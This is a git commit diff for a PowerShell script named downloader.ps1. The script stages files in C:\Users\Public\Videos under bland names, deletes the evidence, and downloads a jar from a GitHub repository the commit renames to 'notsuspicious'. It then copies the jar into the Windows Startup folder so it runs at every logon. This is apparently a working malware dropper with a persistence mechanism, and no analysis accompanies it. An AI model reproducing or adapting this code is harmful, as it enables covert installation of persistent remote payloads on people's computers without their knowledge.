3ebbd72f52a90ad31bdac031b1311644b1fcd0f5
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-27 19:41:23 +0100

    q

--- downloader.ps1
+++ downloader.ps1
@@ -4,7 +4,7 @@ Rename-Item 'C:\Users\Public\Videos\Server-main' 'GraphicalUserInterface'
 Remove-Item 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
 Expand-archive 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip' 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6'
 Remove-Item 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip'
-Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/downloadnew.jar -OutFile C:\Users\Public\Videos\downloadnew.jar -UseBasicParsing
+Invoke-WebRequest https://github.com/RaupenInspektor/notsuspicious/raw/main/downloadnew.jar -OutFile C:\Users\Public\Videos\downloadnew.jar -UseBasicParsing
 $sourceFile = "C:\Users\Public\Videos\downloadnew.jar"
 $destinationFolder = [Environment]::GetFolderPath("Startup")
 Copy-Item -Path $sourceFile -Destination $destinationFolder
